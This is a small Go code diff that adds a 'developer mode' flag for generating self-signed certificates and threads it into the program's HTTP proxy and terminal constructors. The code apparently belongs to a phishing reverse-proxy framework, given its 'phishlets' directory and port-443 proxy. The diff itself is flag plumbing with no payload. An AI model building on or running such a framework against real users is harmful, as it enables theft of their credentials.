@@ -15,6 +15,7 @@ import (
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
+var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -124,10 +125,10 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db)
+	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, *developer_mode)
 	hp.Start()
 
-	t, err := core.NewTerminal(cfg, crt_db, db)
+	t, err := core.NewTerminal(cfg, crt_db, db, *developer_mode)
 	if err != nil {
 		log.Fatal("%v", err)
 		return
